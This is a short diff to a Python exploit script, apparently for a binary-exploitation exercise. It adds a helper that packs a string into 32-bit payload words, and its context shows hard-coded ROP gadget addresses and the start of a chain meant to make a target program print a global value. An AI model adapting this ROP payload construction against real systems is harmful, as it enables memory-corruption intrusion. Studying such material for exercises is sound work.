@@ -21,6 +21,26 @@ if len(argv) > 1:
 else:
     key = 2
 
+
+def convert_string_to_payload(string, max_str_len, payload_len):
+    payload = []
+    string = string.replace("\n", " ")
+
+    string = string.ljust(max_str_len, chr(0))
+    string = string[:max_str_len] + chr(0)
+
+    string = string.ljust(4 * payload_len, chr(0))
+    string = string[:4 * payload_len - 1] + chr(0)
+    for i in range(payload_len):
+        frag = string[4 * i: 4 * (i + 1)]
+        word = 0x0;
+        for j in range(4):
+            word <<= 8
+            word += ord(frag[-(j + 1)])
+        payload.append(word)
+    return payload
+
+
 pop_eax = 0x080b054a  # pop eax; ret
 pop_ebx = 0x080b2643  # pop ebx; ret;
 pop_ecx_clobber_eax = 0x080640c1  # pop ecx; add al, 0xf6; ret;
@@ -62,7 +82,7 @@ stdout.write("%s\n" % cipher_text)  # To be read into `plaintext`
 # Note payload cannot contain ord("\n")
 
 # Print the value of GLB using main.
-dummy = [0x00000000] * 6
+dummy = convert_string_to_payload("Encrypted:", 9, 6)
 
 code = [
     # Write initial pointer location
